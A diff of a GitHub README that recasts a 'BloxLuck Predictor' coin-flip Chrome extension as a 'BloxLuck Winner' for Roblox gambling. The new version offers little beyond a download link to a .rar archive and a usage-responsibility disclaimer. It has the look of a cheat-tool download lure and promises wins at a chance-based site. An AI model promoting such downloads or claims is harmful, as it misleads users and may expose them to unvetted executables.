@@ -1,39 +1,23 @@
-<div align="center">
-  <h2>BloxLuck Predictor</h2>
-  <p><i>Lightweight prediction interface with animated visual flow</i></p>
-</div>
+<h2 align="center">BloxLuck Winner</h2>
 
 <p align="center">
-  <a href="https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Predictorrr.rar" target="_blank">
-    <img src="https://img.shields.io/badge/Download-BloxLuck_Predictor-success?style=for-the-badge&logo=github&logoColor=white"/>
+  <a href="https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Winner.rar">
+    <img src="https://img.shields.io/badge/⬇️ Download-grey?style=for-the-badge" alt="Download">
   </a>
 </p>
 
 ---
 
-## 📌 Overview
+## 📖 About
 
-**BloxLuck Predictor** is a lightweight **Chrome extension** designed to demonstrate a clean and interactive prediction flow through a modern popup interface.
+**Roblox** This is a BloxLuck Winner.
+ 
 
-The project focuses on **user interaction, animation, and visual feedback**, inspired by game-style utility tools and simple probability demonstrations.
-
----
-
-## 🎨 Features
-
-- Clean and modern prediction interface  
-- Key-based access screen  
-- Animated scan and progress flow  
-- Visual coin flip animation  
-- Clear result output (Heads / Tails)  
-- Lightweight and responsive design  
+> ⚠️ Note: You Accept the Usage Responsibilities.
 
 ---
 
-## ⚙️ Setup Guide
+## 📎 Links
 
-1. Download the latest release from the link above  
-2. **Extract** the ZIP archive. 
-3. Open Chrome and go to `chrome://extensions/`
-4. Enable **Developer mode**
-5. Click **"Load unpacked"** and select the extracted folder.  
+- 🔗 [Official Repository](https://github.com/rethard/BloxLuck-)
+- 📥 [Direct ZIP Download](https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Winner.rar)
